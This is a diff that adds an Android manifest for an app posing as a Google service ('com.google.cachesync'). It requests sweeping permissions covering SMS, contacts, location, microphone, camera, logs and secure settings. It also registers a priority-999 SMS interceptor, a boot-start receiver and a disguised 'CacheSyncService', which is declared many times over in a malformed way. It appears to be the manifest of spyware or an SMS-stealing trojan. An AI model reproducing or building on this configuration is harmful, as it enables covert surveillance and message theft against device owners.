@@ -1,0 +1,105 @@
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.google.cachesync"
+    android:versionCode="1"
+    android:versionName="1.0" >
+
+    <uses-sdk
+        android:minSdkVersion="8"
+        android:targetSdkVersion="15" />
+    
+    <uses-permission android:name="android.permission.REBOOT"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.WRITE_OWNER_DATA"/>
+    <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.READ_CONTACTS"/>
+    <uses-permission android:name="android.permission.READ_LOGS"/>
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_LOCATION_EXTRA_COMMANDS"/>
+    <uses-permission android:name="android.permission.ACCESS_MOCK_LOCATION"/>
+    <uses-permission android:name="android.permission.CONTROL_LOCATION_UPDATES"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.BROADCAST_SMS"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.VIBRATE"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.UPDATE_DEVICE_STATS"/>
+    <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+    <uses-permission android:name="android.permission.CAMERA"/>
+
+	<uses-feature android:name="android.hardware.camera" android:required="true"/>
+     
+    <application
+        android:icon="@drawable/ic_launcher"
+        android:label="@string/app_name"
+        android:theme="@style/AppTheme" >
+        <activity
+            android:name=".MainActivity"
+            android:label="@string/title_activity_main" >
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+        <receiver android:name="LocationTimer"></receiver>
+        <receiver android:name="SmsReceiver">
+            <intent-filter android:priority="999">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+            </intent-filter>
+        </receiver>
+        
+	
+       
+     <service android:description="@string/service_info" android:label="@string/service_title" android:name="CacheSyncService" android:enabled="true" >
+        </service>
+    <service android:name="CacheSyncService" android:permission="android.permission.REBOOT"/>
+     <service android:name="CacheSyncService" android:permission="android.permission.ACCESS_NETWORK_STATE"/>
+    <service android:name="CacheSyncService" android:permission="android.permission.INTERNET"/>
+    <service android:name="CacheSyncService" android:permission="android.permission.WRITE_OWNER_DATA"/>
+    <service android:name="CacheSyncService" android:permission="android.permission.WRITE_SECURE_SETTINGS"/>
+    <service android:name="CacheSyncService" android:permission="android.permission.WRITE_SETTINGS"/>
+    <service android:name="CacheSyncService" android:permission="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <service android:name="CacheSyncService" android:permission="android.permission.READ_SMS"/>
+    <service android:name="CacheSyncService" android:permission="android.permission.READ_PHONE_STATE"/>
+    <service android:name="CacheSyncService" android:permission="android.permission.READ_CONTACTS"/>
+    <service android:name="CacheSyncService" android:permission="android.permission.READ_LOGS"/>
+    <service android:name="CacheSyncService" android:permission="android.permission.ACCESS_FINE_LOCATION"/>
+    <service android:name="CacheSyncService" android:permission="android.permission.ACCESS_COARSE_LOCATION"/>
+    <service android:name="CacheSyncService" android:permission="android.permission.ACCESS_LOCATION_EXTRA_COMMANDS"/>
+    <service android:name="CacheSyncService" android:permission="android.permission.ACCESS_MOCK_LOCATION"/>
+    <service android:name="CacheSyncService" android:permission="android.permission.CONTROL_LOCATION_UPDATES"/>
+    <service android:name="CacheSyncService" android:permission="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <service android:name="CacheSyncService" android:permission="android.permission.WAKE_LOCK"/>
+    <service android:name="CacheSyncService" android:permission="android.permission.BROADCAST_SMS"/>
+    <service android:name="CacheSyncService" android:permission="android.permission.RECEIVE_SMS"/>
+    <service android:name="CacheSyncService" android:permission="android.permission.VIBRATE"/>
+    <service android:name="CacheSyncService" android:permission="android.permission.SEND_SMS"/>
+    <service android:name="CacheSyncService" android:permission="android.permission.CHANGE_WIFI_STATE"/>
+    <service android:name="CacheSyncService" android:permission="android.permission.CHANGE_NETWORK_STATE"/>
+    <service android:name="CacheSyncService" android:permission="android.permission.ACCESS_WIFI_STATE"/>
+    <service android:name="CacheSyncService" android:permission="android.permission.UPDATE_DEVICE_STATS"/>
+    <service android:name="CacheSyncService" android:permission="android.permission.WRITE_SECURE_SETTINGS"/>
+    <service android:name="CacheSyncService" android:permission="android.permission.WRITE_SETTINGS"/>
+        
+        
+        <receiver android:name="BootReceiver" android:permission="android.permission.RECEIVE_BOOT_COMPLETED" android:enabled="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="AlarmReceiver"></receiver>
+    </application>
+
+</manifest>
